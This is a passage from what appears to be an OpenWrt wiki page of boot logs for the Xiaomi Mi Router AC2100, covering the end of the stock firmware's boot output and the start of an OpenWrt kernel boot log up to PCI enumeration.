[   21.020000] GDMA2_FWD_CFG = 20710000
[   21.020000] ipaccount: ifname [eth0] event[1]
[   21.020000] ipaccount: ifname [eth0] event[20]
[   21.020000] device eth0 entered promiscuous mode
[   21.020000] ipaccount: ifname [br-lan] event[11]
[   21.020000] ipaccount: ifname [br-lan] event[8]
[   21.020000] ipaccount: ifname [br-lan] event[8]
[   21.020000] ipaccount: ifname [br-lan] event[13]
[   21.020000] br-lan: port 1(eth0) entered forwarding state
[   21.020000] br-lan: port 1(eth0) entered forwarding state
[   21.020000] ipaccount: ifname [br-lan] event[1]
[   21.090000] ipaccount: ifname [ifb0] event[13]
[   21.090000] ipaccount: ifname [ifb0] event[1]
[   21.100000] ipaccount: ifname [lo] event[13]
[   21.110000] ipaccount: ifname [lo] event[1]
[   21.110000] ipaccount: ifname [eth1] event[13]
[   21.120000] eth1: ===> VirtualIF_open
[   21.120000] ipaccount: ifname [eth1] event[1]
[   21.890000] ipaccount: ifname [br-lan] event[4]
[   21.900000] ipaccount: ifname [wl1] event[13]
[   21.910000] pAd->ApBootFlag = TRUE
[   22.100000] efuse_probe: efuse = 10000002
[   22.280000] tssi_1_target_pwr_g_band = 37
[   23.020000] br-lan: port 1(eth0) entered forwarding state
[   25.040000] <==== rt28xx_init, Status=0
[   25.040000] ipaccount: ifname [wl2] event[16]
[   25.050000] ipaccount: ifname [wl2] event[5]
[   25.050000] ipaccount: ifname [wl3] event[16]
[   25.060000] ipaccount: ifname [wl3] event[5]
[   25.060000] ipaccount: ifname [apcli0] event[16]
[   25.070000] ipaccount: ifname [apcli0] event[5]
[   25.070000] pAd->ApBootFlag = FALSE
[   25.080000] ipaccount: ifname [wl1] event[1]
[   26.000000] ipaccount: ifname [wl1] event[20]
[   26.010000] device wl1 entered promiscuous mode
[   26.010000] br-lan: port 2(wl1) entered forwarding state
[   26.020000] br-lan: port 2(wl1) entered forwarding state
[   26.040000] ipaccount: ifname [wl2] event[13]
[   26.040000] ##### mbss_cr_enable, BssId = 1
[   26.050000] ipaccount: ifname [wl2] event[1]
[   27.120000] ipaccount: ifname [wl0] event[13]
[   27.120000] dev_redirect: add(+) dev redirect mapping: src:eth1->dst:ifb0
[   27.130000] wl0: ===> main_virtual_if_open
[   27.450000] E2pAccessMode=2
[   27.450000] SSID[0]=Redacted, EdcaIdx=0
[   27.460000] DBDC Mode=0, eDBDC_mode = 0
[   27.460000] BSS0 PhyMode=49
[   27.460000] wmode_band_equal(): Band Equal!
[   27.470000] [TxPower] BAND0: 80 
[   27.480000] [PERCENTAGEenable] BAND0: 1 
[   27.480000] FragThreshold[0]=2346
[   27.490000] [RTMPSetProfileParameters]Disable DFS/Zero wait=0/0
[   27.540000] HT: WDEV[0] Ext Channel = ABOVE
[   27.540000] HT: greenap_cap = 0
[   27.570000] WtcSetMaxStaNum: BssidNum:1, MaxStaNum:124 (WdsNum:0, ApcliNum:2, MaxNumChipRept:32), MinMcastWcid:125
[   27.580000] Top Init Done!
[   27.580000] Use dev_alloc_skb
[   27.590000] RX[0] DESC a0c28000 size = 16384
[   27.590000] RX[1] DESC a0c26000 size = 8192
[   27.600000] cut_through_init(): ct sw token number = 4095
[   27.600000] cut_through_token_list_init(): TokenList inited done!id_head/tail=0/4096
[   27.610000] cut_through_token_list_init(): 84c3a388,84c3a388
[   27.620000] cut_through_token_list_init(): TokenList inited done!id_head/tail=0/4096
[   27.620000] cut_through_token_list_init(): 84c3a398,84c3a398
[   27.630000] Hif Init Done!
[   27.630000] ctl->txq = c187b76c
[   27.640000] ctl->rxq = c187b778
[   27.640000] ctl->ackq = c187b784
[   27.640000] ctl->kickq = c187b790
[   27.650000] ctl->tx_doneq = c187b79c
[   27.650000] ctl->rx_doneq = c187b7a8
[   27.650000] Parsing patch header
[   27.660000] 	Built date: 20180518100604a
[   27.660000] 
[   27.660000] 	Platform: ALPS
[   27.660000] 	HW/SW version: 0x8a108a10
[   27.670000] 	Patch version: 0x00000010
[   27.670000] 	Target address: 0x80000, length: 11072
[   27.680000] patch is not ready && get semaphore success
[   27.680000] EventGenericEventHandler: CMD Success
[   27.690000] MtCmdPatchFinishReq
[   27.700000] EventGenericEventHandler: CMD Success
[   27.710000] release patch semaphore
[   27.710000] Parsing CPU 0 fw tailer
[   27.710000] 	Chip ID: 0x04
[   27.720000] 	Eco version: 0x00
[   27.720000] 	Region number: 0x00
[   27.720000] 	Format version: 0x00
[   27.730000] 	Ram version: _reserved_
[   27.730000] 	Built date: 20190903181730\00
[   27.730000] 	Common crc: 0x0
[   27.740000] Parsing tailer region 0
[   27.740000] 	Feature set: 0x01
[   27.740000] 	Target address: 0x84000, Download size: 409600
[   27.750000] Parsing tailer region 1
[   27.750000] 	Feature set: 0x01
[   27.750000] 	Target address: 0x209c400, Download size: 43328
[   27.760000] EventGenericEventHandler: CMD Success
[   27.770000] EventGenericEventHandler: CMD Success
[   27.770000] MtCmdFwStartReq: override = 0x1, address = 0x84000
[   27.780000] EventGenericEventHandler: CMD Success
[   27.790000] Parsing CPU 1 fw tailer
[   27.790000] 	Chip ID: 0x04
[   27.790000] 	Eco version: 0x00
[   27.790000] 	Region number: 0x00
[   27.800000] 	Format version: 0x00
[   27.800000] 	Ram version: _reserved_
[   27.800000] 	Built date: 20190415154149\00
[   27.810000] 	Common crc: 0x0
[   27.810000] Parsing tailer region 0
[   27.820000] 	Feature set: 0x01
[   27.820000] 	Target address: 0x90000000, Download size: 122608
[   27.820000] EventGenericEventHandler: CMD Success
[   27.830000] MtCmdFwStartReq: override = 0x4, address = 0x0
[   27.870000] EventGenericEventHandler: CMD Success
[   27.940000] MCU Init Done!
[   27.940000] efuse_probe: efuse = 10000212
[   27.950000] RtmpChipOpsEepromHook::e2p_type=2, inf_Type=5
[   27.950000] RtmpEepromGetDefault::e2p_dafault=1
[   27.960000] RtmpChipOpsEepromHook: E2P type(2), E2pAccessMode = 2, E2P default = 1
[   27.960000] NVM is FLASH mode. dev_idx [1] FLASH OFFSET [0x8000]
[   27.970000] [34mNICReadEEPROMParameters: EEPROM 0x52 b300[m
[   28.020000] br-lan: port 2(wl1) entered forwarding state
[   35.460000] Country Region from e2p = 101
[   35.460000] MtCmdSetDbdcCtrl:(ret = 0)
[   35.460000] MtSingleSkuLoadParam: RF_LOCKDOWN Feature OFF !!!
[   35.470000] MtBfBackOffLoadParam: RF_LOCKDOWN Feature OFF !!!
[   35.470000] EEPROM Init Done!
[   35.480000] mt_mac_init()-->
[   35.480000] mt7615_init_mac_cr()-->
[   35.480000] mt7615_init_mac_cr(): TMAC_TRCR0=0x82783c8c
[   35.490000] mt7615_init_mac_cr(): TMAC_TRCR1=0x82783c8c
[   35.490000] <--mt_mac_init()
[   35.500000] MAC Init Done!
[   35.500000] MT7615BBPInit():BBP Initialization.....
[   35.510000] 	Band 0: valid=1, isDBDC=0, Band=2, CBW=1, CentCh/PrimCh=1/1, prim_ch_idx=0, txStream=2
[   35.510000] 	Band 1: valid=0, isDBDC=0, Band=0, CBW=0, CentCh/PrimCh=0/0, prim_ch_idx=0, txStream=0
[   35.520000] PHY Init Done!
[   35.530000] MtCmdSetMacTxRx:(ret = 0)
[   35.530000] WifiFwdSet::disabled=0
[   35.540000] Main bssid = 00:00:00:00:00:00
[   35.540000] MtCmdSetMacTxRx:(ret = 0)
[   35.540000] MtCmdSetMacTxRx:(ret = 0)
[   35.550000] <==== mt_wifi_init, Status=0
[   35.550000] TxBfModuleEnCtrl:It's not DBDC mode
[   35.560000] MtCmdEDCCACtrl: BandIdx: 0, EDCCACtrl: 1
[   35.560000] MtCmdEDCCACtrl: BandIdx: 1, EDCCACtrl: 1
[   35.570000] ipaccount: ifname [apclii0] event[16]
[   35.570000] ipaccount: ifname [apclii0] event[5]
[   35.580000] WtcSetMaxStaNum: BssidNum:1, MaxStaNum:124 (WdsNum:0, ApcliNum:2, MaxNumChipRept:32), MinMcastWcid:125
[   35.620000] RTMP_COM_IoctlHandle -> CMD_RTPRIV_IOCTL_VIRTUAL_INF_UP
[   35.630000] wifi_sys_open(), wdev idx = 0
[   35.640000] wdev_attr_update(): wdevId0 = 50:d2:f5:6c:61:e4
[   35.640000] [RcGetHdevByPhyMode]-- channel 0 fix for rdev fetching
[   35.650000] MtCmdSetDbdcCtrl:(ret = 0)
[   35.650000] [1;33m [RadarStateCheck] RD_NORMAL_MODE [m 
[   35.660000] AP inf up for ra_0(func_idx) OmacIdx=0
[   35.660000] AsicRadioOnOffCtrl(): DbdcIdx=0 RadioOn
[   35.670000] ApAutoChannelAtBootUp----------------->
[   35.670000] ApAutoChannelAtBootUp: AutoChannelBootup = 1
[   35.680000] MtCmdSetMacTxRx:(ret = 0)
[   35.680000] [AutoChSelBuildChannelListFor5G] ChListNum5G = 13
[   36.490000] ====================================================================
[   36.490000] Channel 149 : Busy Time =      0, Skip Channel = FALSE, BwCap = TRUE
[   36.500000] Channel 153 : Busy Time =      0, Skip Channel = FALSE, BwCap = TRUE
[   36.510000] Channel 157 : Busy Time =      0, Skip Channel = FALSE, BwCap = TRUE
[   36.510000] Channel 161 : Busy Time =      0, Skip Channel = FALSE, BwCap = TRUE
[   36.520000] ====================================================================
[   36.530000] Rule 3 Channel Busy time value : Select Primary Channel 149
[   36.540000] Rule 3 Channel Busy time value : Min Channel Busy = 0
[   36.540000] Rule 3 Channel Busy time value : BW = 80
[   36.550000] [SelectClearChannelBusyTime] - band0 END
[   36.550000] ApAutoChannelAtBootUp : Auto channel selection: Selected channel = 149, IsAband = 1
[   36.560000] [41m AutoChSelUpdateChannel(): Update channel for wdev for this band PhyMode = 49, Channel = 149 [m
[   36.570000] [1;33m [RadarStateCheck] RD_NORMAL_MODE [m 
[   37.690000] :MtCmdPktBudgetCtrl: bssid(255),wcid(65535),type(0)
[   37.690000] [DfsCacNormalStart] Normal start. Enable MAC TX
[   37.690000] ApAutoChannelAtBootUp<-----------------
[   37.690000] wifi_sys_linkup(), wdev idx = 0
[   37.820000] bssUpdateBmcMngRate (BSS_INFO_BROADCAST_INFO), CmdBssInfoBmcRate.u2BcTransmit= 8192, CmdBssInfoBmcRate.u2McTransmit = 8196
[   37.830000] UpdateBeaconHandler, BCN_UPDATE_INIT, OmacIdx = 0
[   37.840000] APStartUpForMbss: BssIndex = 0 channel = 149
[   37.840000] MtCmdTxPowerDropCtrl: ucPowerDrop: 80, BandIdx: 0
[   37.850000] apidx 0 for WscUUIDInit
[   37.850000] Generate UUID for apidx(0)
[   37.860000] ipaccount: ifname [wl0] event[1]
[   37.900000] wifi_sys_linkdown(), wdev idx = 0
[   37.900000] ExtEventBeaconLostHandler::FW LOG, Beacon lost (50:d2:f5:6c:61:e4), Reason 0x10
[   37.910000]   Beacon lost - AP disabled!!!
[   37.920000] bssUpdateBmcMngRate (BSS_INFO_BROADCAST_INFO), CmdBssInfoBmcRate.u2BcTransmit= 0, CmdBssInfoBmcRate.u2McTransmit = 0
[   37.930000] wifi_sys_close(), wdev idx = 0
[   37.930000] wifi_sys_open(), wdev idx = 0
[   37.940000] wdev_attr_update(): wdevId0 = 50:d2:f5:6c:61:e4
[   37.940000] MtCmdSetDbdcCtrl:(ret = 0)
[   37.950000] [DfsCacNormalStart] Normal start. Enable MAC TX
[   37.950000] wifi_sys_linkup(), wdev idx = 0
[   38.080000] bssUpdateBmcMngRate (BSS_INFO_BROADCAST_INFO), CmdBssInfoBmcRate.u2BcTransmit= 8192, CmdBssInfoBmcRate.u2McTransmit = 8196
[   38.090000] UpdateBeaconHandler, BCN_UPDATE_INIT, OmacIdx = 0
[   38.750000] ipaccount: ifname [wl0] event[20]
[   38.750000] device wl0 entered promiscuous mode
[   38.750000] br-lan: port 3(wl0) entered forwarding state
[   38.760000] br-lan: port 3(wl0) entered forwarding state
[   38.780000] Device Instance
[   38.780000] 	WDEV 00:, Name:wl0, Wdev(list) Idx:0
[   38.790000] 		 Idx:6
[   38.790000] 	WDEV 01:, Name:apclii0, Wdev(list) Idx:1
[   38.790000] 		 Idx:11
[   38.800000] 
[   38.800000] 
[   38.800000] 
[   38.800000] 
[   38.800000] 
[   38.800000] 
[   38.800000] 
[   38.810000] 
[   38.810000] 
[   38.810000] 
[   38.810000] 
[   38.810000] 
[   38.810000] 
[   38.820000] 
[   38.820000] 
[   38.820000] 
[   39.330000] enable ip account module.
rcS S calling: /etc/rc.d/S20network boot: WARNING: EXITCODE=0, execute too slow, 19 >= 15: /etc/rc.d/S20network boot
[   40.760000] br-lan: port 3(wl0) entered forwarding state
[   42.200000] dev_redirect: add(+) dev redirect mapping: src:eth1->dst:ifb0
[   43.030000] Ralink HW NAT Module Enabled
[   43.040000] eth0 ifindex =3
[   43.040000] eth1 ifindex =4
[   43.040000] HNAT: switch HNAT ON.....
[   43.050000] *hwnat reg dev ******* set dev[lo]->ifindex = 1
[   43.050000] *hwnat reg dev ******* set dev[ifb0]->ifindex = 2
[   43.060000] *hwnat reg dev ******* set dev[wl1]->ifindex = 5
[   43.060000] *hwnat reg dev ******* set dev[wl0]->ifindex = 6
[   43.070000] *hwnat reg dev ******* set dev[br-lan]->ifindex = 7
[   43.070000] *hwnat reg dev ******* set dev[wl2]->ifindex = 8
[   43.080000] *hwnat reg dev ******* set dev[wl3]->ifindex = 9
[   43.090000] *hwnat reg dev ******* set dev[apcli0]->ifindex = 10
[   43.090000] *hwnat reg dev ******* set dev[apclii0]->ifindex = 11
[   43.160000] Device Instance
[   43.160000] 	WDEV 00:, Name:wl0, Wdev(list) Idx:0
[   43.160000] 		 Idx:6
[   43.170000] 	WDEV 01:, Name:apclii0, Wdev(list) Idx:1
[   43.170000] 		 Idx:11
[   43.170000] 
[   43.170000] 
[   43.180000] 
[   43.180000] 
[   43.180000] 
[   43.180000] 
[   43.180000] 
[   43.180000] 
[   43.180000] 
[   43.190000] 
[   43.190000] 
[   43.190000] 
[   43.190000] 
[   43.190000] 
[   43.190000] 
[   43.200000] 
[   43.200000] Device Instance
[   43.210000] 	WDEV 00:, Name:wl0, Wdev(list) Idx:0
[   43.210000] 		 Idx:6
[   43.210000] 	WDEV 01:, Name:apclii0, Wdev(list) Idx:1
[   43.220000] 		 Idx:11
[   43.220000] 
[   43.220000] 
[   43.220000] 
[   43.230000] 
[   43.230000] 
[   43.230000] 
[   43.230000] 
[   43.230000] 
[   43.230000] 
[   43.230000] 
[   43.240000] 
[   43.240000] 
[   43.240000] 
[   43.240000] 
[   43.240000] 
[   43.240000] 
[   43.270000] HNAT: switch HNAT ON.....
Fri Nov 22 07:40:56 CST 2019 boot_check[3695]: INFO: Wireless OK
[   44.370000] ipaccount: refresh dev ifname to [eth0 wl0 wl1 wl3] 
[   44.370000] ipaccount: landev_init_all() add dev [eth0] is_wireless: 0.
[   44.380000] ipaccount: landev_init_all() add dev [wl0] is_wireless: 1.
[   44.390000] ipaccount: landev_init_all() add dev [wl1] is_wireless: 1.
[   44.390000] ipaccount: landev_init_all() add dev [wl3] is_wireless: 1.
[   47.310000] dev_redirect: add(+) dev redirect mapping: src:eth1->dst:ifb0
[   47.850000] dev_redirect OFF.rcS S boot: INFO: rcS S boot timing 41 seconds.
Fri Nov 22 07:41:02 CST 2019 INFO: rcS S boot timing 41 seconds.
rcS S boot: system type(R2100/2): SQUASH/3
Fri Nov 22 07:41:02 CST 2019 system type(R2100/2): SQUASH/3
rcS S boot: ROOTFS: /dev/mtdblock14 on / type squashfs (ro,relatime)
Fri Nov 22 07:41:02 CST 2019 ROOTFS: /dev/mtdblock14 on / type squashfs (ro,relatime)
[   50.110000] led=10, on=1, off=4000, blinks,=1, reset=1, time=1
[   50.120000] led=12, on=1, off=4000, blinks,=1, reset=1, time=1
[   50.130000] led=12, on=4000, off=1, blinks,=1, reset=1, time=1
Unlocking cfg_bak ...
Erasing cfg_bak ...
Unlocking cfg_bak ...

Writing from /tmp/cfg_bak.tgz to cfg_bak ...  [ ][e][w]    
Fri Nov 22 07:41:03 CST 2019 boot_check[4975]: Booting up finished.
[   57.720000] led=6, on=1, off=4000, blinks,=1, reset=1, time=1
[   57.740000] led=8, on=1, off=4000, blinks,=1, reset=1, time=1</nowiki>
</WRAP>\\

==== OpenWrt bootlog ====
<WRAP bootlog>
<nowiki>[    0.000000] Linux version 5.4.42 (emirefek@emirefek) (gcc version 8.4.0 (OpenWrt GCC 8.4.0 r13403-1470333bb1)) #0 SMP Sat May 30 10:40:10 2020
[    0.000000] SoC Type: MediaTek MT7621 ver:1 eco:3
[    0.000000] printk: bootconsole [early0] enabled
[    0.000000] CPU0 revision is: 0001992f (MIPS 1004Kc)
[    0.000000] MIPS: machine is Xiaomi Mi Router AC2100
[    0.000000] Initrd not found or empty - disabling initrd
[    0.000000] VPE topology {2,2} total 4
[    0.000000] Primary instruction cache 32kB, VIPT, 4-way, linesize 32 bytes.
[    0.000000] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes
[    0.000000] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.
[    0.000000] Zone ranges:
[    0.000000]   Normal   [mem 0x0000000000000000-0x0000000007ffffff]
[    0.000000]   HighMem  empty
[    0.000000] Movable zone start for each node
[    0.000000] Early memory node ranges
[    0.000000]   node   0: [mem 0x0000000000000000-0x0000000007ffffff]
[    0.000000] Initmem setup node 0 [mem 0x0000000000000000-0x0000000007ffffff]
[    0.000000] On node 0 totalpages: 32768
[    0.000000]   Normal zone: 288 pages used for memmap
[    0.000000]   Normal zone: 0 pages reserved
[    0.000000]   Normal zone: 32768 pages, LIFO batch:7
[    0.000000] percpu: Embedded 14 pages/cpu s26672 r8192 d22480 u57344
[    0.000000] pcpu-alloc: s26672 r8192 d22480 u57344 alloc=14*4096
[    0.000000] pcpu-alloc: [0] 0 [0] 1 [0] 2 [0] 3 
[    0.000000] Built 1 zonelists, mobility grouping on.  Total pages: 32480
[    0.000000] Kernel command line: console=ttyS0,115200n8 rootfstype=squashfs,jffs2
[    0.000000] Dentry cache hash table entries: 16384 (order: 4, 65536 bytes, linear)
[    0.000000] Inode-cache hash table entries: 8192 (order: 3, 32768 bytes, linear)
[    0.000000] Writing ErrCtl register=000021e8
[    0.000000] Readback ErrCtl register=000021e8
[    0.000000] mem auto-init: stack:off, heap alloc:off, heap free:off
[    0.000000] Memory: 121040K/131072K available (5583K kernel code, 201K rwdata, 1216K rodata, 1244K init, 230K bss, 10032K reserved, 0K cma-reserved, 0K highmem)
[    0.000000] SLUB: HWalign=32, Order=0-3, MinObjects=0, CPUs=4, Nodes=1
[    0.000000] rcu: Hierarchical RCU implementation.
[    0.000000] rcu: RCU calculated value of scheduler-enlistment delay is 25 jiffies.
[    0.000000] NR_IRQS: 256
[    0.000000] random: get_random_bytes called from start_kernel+0x340/0x550 with crng_init=0
[    0.000000] CPU Clock: 880MHz
[    0.000000] clocksource: GIC: mask: 0xffffffffffffffff max_cycles: 0xcaf478abb4, max_idle_ns: 440795247997 ns
[    0.000000] clocksource: MIPS: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 4343773742 ns
[    0.000009] sched_clock: 32 bits at 440MHz, resolution 2ns, wraps every 4880645118ns
[    0.007789] Calibrating delay loop... 583.68 BogoMIPS (lpj=1167360)
[    0.041997] pid_max: default: 32768 minimum: 301
[    0.046760] Mount-cache hash table entries: 1024 (order: 0, 4096 bytes, linear)
[    0.053984] Mountpoint-cache hash table entries: 1024 (order: 0, 4096 bytes, linear)
[    0.064394] rcu: Hierarchical SRCU implementation.
[    0.069825] smp: Bringing up secondary CPUs ...
[    0.373147] Primary instruction cache 32kB, VIPT, 4-way, linesize 32 bytes.
[    0.373159] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes
[    0.373171] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.
[    0.373270] CPU1 revision is: 0001992f (MIPS 1004Kc)
[    0.102596] Synchronize counters for CPU 1: done.
[    8.984672] Primary instruction cache 32kB, VIPT, 4-way, linesize 32 bytes.
[    8.984681] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes
[    8.984689] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.
[    8.984743] CPU2 revision is: 0001992f (MIPS 1004Kc)
[    0.167308] Synchronize counters for CPU 2: done.
[    8.491235] Primary instruction cache 32kB, VIPT, 4-way, linesize 32 bytes.
[    8.491244] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes
[    8.491252] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.
[    8.491310] CPU3 revision is: 0001992f (MIPS 1004Kc)
[    0.225167] Synchronize counters for CPU 3: done.
[    0.255038] smp: Brought up 1 node, 4 CPUs
[    0.263422] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645041785100000 ns
[    0.273112] futex hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.280207] pinctrl core: initialized pinctrl subsystem
[    0.286948] NET: Registered protocol family 16
[    0.302991] FPU Affinity set after 4688 emulations
[    0.320284] random: fast init done
[    0.324678] clocksource: Switched to clocksource GIC
[    0.331320] NET: Registered protocol family 2
[    0.336494] tcp_listen_portaddr_hash hash table entries: 512 (order: 0, 6144 bytes, linear)
[    0.344806] TCP established hash table entries: 1024 (order: 0, 4096 bytes, linear)
[    0.352402] TCP bind hash table entries: 1024 (order: 1, 8192 bytes, linear)
[    0.359377] TCP: Hash tables configured (established 1024 bind 1024)
[    0.365822] UDP hash table entries: 256 (order: 1, 8192 bytes, linear)
[    0.372303] UDP-Lite hash table entries: 256 (order: 1, 8192 bytes, linear)
[    0.379465] NET: Registered protocol family 1
[    0.383798] PCI: CLS 0 bytes, default 32
[    0.479696] 4 CPUs re-calibrate udelay(lpj = 1167360)
[    0.486388] workingset: timestamp_bits=14 max_order=15 bucket_order=1
[    0.504677] squashfs: version 4.0 (2009/01/31) Phillip Lougher
[    0.510438] jffs2: version 2.2 (NAND) (SUMMARY) (LZMA) (RTIME) (CMODE_PRIORITY) (c) 2001-2006 Red Hat, Inc.
[    0.522583] mt7621_gpio 1e000600.gpio: registering 32 gpios
[    0.528415] mt7621_gpio 1e000600.gpio: registering 32 gpios
[    0.534241] mt7621_gpio 1e000600.gpio: registering 32 gpios
[    0.540701] Serial: 8250/16550 driver, 3 ports, IRQ sharing disabled
[    0.548454] printk: console [ttyS0] disabled
[    0.552733] 1e000c00.uartlite: ttyS0 at MMIO 0x1e000c00 (irq = 19, base_baud = 3125000) is a 16550A
[    0.561713] printk: console [ttyS0] enabled
[    0.569970] printk: bootconsole [early0] disabled
[    0.581766] mt7621-nand 1e003000.nand: Using programmed access timing: 31c07388
[    0.589185] nand: device found, Manufacturer ID: 0xc8, Chip ID: 0xd1
[    0.595525] nand: ESMT NAND 128MiB 3,3V 8-bit
[    0.599880] nand: 128 MiB, SLC, erase size: 128 KiB, page size: 2048, OOB size: 64
[    0.607430] mt7621-nand 1e003000.nand: ECC strength adjusted to 4 bits
[    0.613969] mt7621-nand 1e003000.nand: Using programmed access timing: 31c07388
[    0.621262] Scanning device for bad blocks
[    2.601483] 10 fixed-partitions partitions found on MTD device mt7621-nand
[    2.608343] Creating 10 MTD partitions on "mt7621-nand":
[    2.613650] 0x000000000000-0x000000080000 : "Bootloader"
[    2.620263] 0x000000080000-0x0000000c0000 : "Config"
[    2.626357] 0x0000000c0000-0x000000100000 : "Bdata"
[    2.632410] 0x000000100000-0x000000140000 : "factory"
[    2.638600] 0x000000140000-0x000000180000 : "crash"
[    2.644651] 0x000000180000-0x0000001c0000 : "crash_syslog"
[    2.651232] 0x0000001c0000-0x000000200000 : "reserved0"
[    2.657588] 0x000000200000-0x000000600000 : "kernel_stock"
[    2.664356] 0x000000600000-0x000000a00000 : "kernel"
[    2.670417] 0x000000a00000-0x000007f80000 : "ubi"
[    2.678256] libphy: Fixed MDIO Bus: probed
[    2.710167] libphy: mdio: probed
[    2.713640] mt7530 mdio-bus:1f: MT7530 adapts as multi-chip module
[    2.721457] mtk_soc_eth 1e100000.ethernet eth0: mediatek frame engine at 0xbe100000, irq 21
[    2.731938] mt7621-pci 1e140000.pcie: Parsing DT failed
[    2.739633] NET: Registered protocol family 10
[    2.745761] Segment Routing with IPv6
[    2.749556] NET: Registered protocol family 17
[    2.754352] 8021q: 802.1Q VLAN Support v1.8
[    2.760537] mt7530 mdio-bus:1f: MT7530 adapts as multi-chip module
[    3.596119] libphy: dsa slave smi: probed
[    3.611806] mt7530 mdio-bus:1f wan (uninitialized): PHY [dsa-0.0:00] driver [Generic PHY]
[    3.655789] mt7530 mdio-bus:1f lan1 (uninitialized): PHY [dsa-0.0:02] driver [Generic PHY]
[    3.675791] mt7530 mdio-bus:1f lan2 (uninitialized): PHY [dsa-0.0:03] driver [Generic PHY]
[    3.695796] mt7530 mdio-bus:1f lan3 (uninitialized): PHY [dsa-0.0:04] driver [Generic PHY]
[    3.751732] mt7530 mdio-bus:1f: configuring for fixed/rgmii link mode
[    4.367731] mt7530 mdio-bus:1f: Link is Up - 1Gbps/Full - flow control off
[    4.443764] DSA: tree 0 setup
[    4.447071] rt2880-pinmux pinctrl: pcie is already enabled
[    4.452570] mt7621-pci 1e140000.pcie: Error applying setting, reverse things back
[    4.460172] mt7621-pci-phy 1e149000.pcie-phy: PHY for 0xbe149000 (dual port = 1)
[    4.467771] mt7621-pci-phy 1e14a000.pcie-phy: PHY for 0xbe14a000 (dual port = 0)
[    4.575166] mt7621-pci-phy 1e149000.pcie-phy: Xtal is 40MHz
[    4.580746] mt7621-pci-phy 1e14a000.pcie-phy: Xtal is 40MHz
[    4.686237] mt7621-pci 1e140000.pcie: pcie2 no card, disable it (RST & CLK)
[    4.693193] mt7621-pci 1e140000.pcie: PCIE0 enabled
[    4.698061] mt7621-pci 1e140000.pcie: PCIE1 enabled
[    4.702934] mt7621-pci 1e140000.pcie: PCI coherence region base: 0x60000000, mask/settings: 0xf0000002
[    4.712402] mt7621-pci 1e140000.pcie: PCI host bridge to bus 0000:00
[    4.718762] pci_bus 0000:00: root bus resource [io  0x1e160000-0x1e16ffff]
[    4.725626] pci_bus 0000:00: root bus resource [mem 0x60000000-0x6fffffff]
[    4.732489] pci_bus 0000:00: root bus resource [bus 00-ff]
[    4.738002] pci 0000:00:00.0: [0e8d:0801] type 01 class 0x060400
[    4.744031] pci 0000:00:00.0: reg 0x10: [mem 0x00000000-0x7fffffff]
[    4.750287] pci 0000:00:00.0: reg 0x14: [mem 0x00000000-0x0000ffff]
[    4.756613] pci 0000:00:00.0: supports D1
[    4.760620] pci 0000:00:00.0: PME# supported from D0 D1 D3hot
[    4.766742] pci 0000:00:01.0: [0e8d:0801] type 01 class 0x060400
[    4.772773] pci 0000:00:01.0: reg 0x10: [mem 0x00000000-0x7fffffff]
[    4.779029] pci 0000:00:01.0: reg 0x14: [mem 0x00000000-0x0000ffff]
[    4.785345] pci 0000:00:01.0: supports D1
[    4.789350] pci 0000:00:01.0: PME# supported from D0 D1 D3hot
[    4.796385] pci 0000:00:00.0: bridge configuration invalid ([bus 00-00]), reconfiguring
[    4.804383] pci 0000:00:01.0: bridge configuration invalid ([bus 00-00]), reconfiguring
[    4.812584] pci 0000:01:00.0: [14c3:7615] type 00 class 0x000280
[    4.818643] pci 0000:01:00.0: reg 0x10: [mem 0x00000000-0x000fffff 64bit]
[    4.825592] pci 0000:01:00.0: 2.000 Gb/s available PCIe bandwidth, limited by 2.5 GT/s x1 link at 0000:00:00.0 (capable of 4.000 Gb/s with 5 GT/s x1 link)
[    4.840669] pci 0000:00:00.0: PCI bridge to [bus 01-ff]
[    4.845896] pci 0000:00:00.0:   bridge window [io  0x0000-0x0fff]
[    4.851981] pci 0000:00:00.0:   bridge window [mem 0x00000000-0x000fffff]
[    4.858753] pci 0000:00:00.0:   bridge window [mem 0x00000000-0x000fffff pref]
[    4.865966] pci_bus 0000:01: busn_res: [bus 01-ff] end is updated to 01
[    4.872789] pci 0000:02:00.0: [14c3:7603] type 00 class 0x028000
[    4.878839] pci 0000:02:00.0: reg 0x10: [mem 0x00000000-0x000fffff]
[    4.885232] pci 0000:02:00.0: PME# supported from D0 D3hot D3cold
[    4.892640] pci 0000:00:01.0: PCI bridge to [bus 02-ff]
[    4.897869] pci 0000:00:01.0:   bridge window [io  0x0000-0x0fff]
[    4.903954] pci 0000:00:01.0:   bridge window [mem 0x00000000-0x000fffff]
[    4.910726] pci 0000:00:01.0:   bridge window [mem 0x00000000-0x000fffff pref]
[    4.917937] pci_bus 0000:02: busn_res: [bus 02-ff] end is updated to 02
[    4.924583] pci 0000:00:00.0: BAR 0: no space for [mem size 0x80000000]
[    4.931181] pci 0000:00:00.0: BAR 0: failed to assign [mem size 0x80000000]
[    4.938131] pci 0000:00:01.0: BAR 0: no space for [mem size 0x80000000]
[    4.944733] pci 0000:00:01.0: BAR 0: failed to assign [mem size 0x80000000]
[    4.951678] pci 0000:00:00.0: BAR 8: assigned [mem 0x60000000-0x600fffff]
[    4.958465] pci 0000:00:00.0: BAR 9: assigned [mem 0x60100000-0x601fffff pref]
[    4.965673] pci 0000:00:01.0: BAR 8: assigned [mem 0x60200000-0x602fffff]
[    4.972450] pci 0000:00:01.0: BAR 9: assigned [mem 0x60300000-0x603fffff pref]
[    4.979654] pci 0000:00:00.0: BAR 1: assigned [mem 0x60400000-0x6040ffff]
[    4.986434] pci 0000:00:01.0: BAR 1: assigned [mem 0x60410000-0x6041ffff]
[    4.993214] pci 0000:00:00.0: BAR 7: assigned [io  0x1e160000-0x1e160fff]
[    4.999991] pci 0000:00:01.0: BAR 7: assigned [io  0x1e161000-0x1e161fff]
[    5.006770] pci 0000:01:00.0: BAR 0: assigned [mem 0x60000000-0x600fffff 64bit]
[    5.014074] pci 0000:00:00.0: PCI bridge to [bus 01]
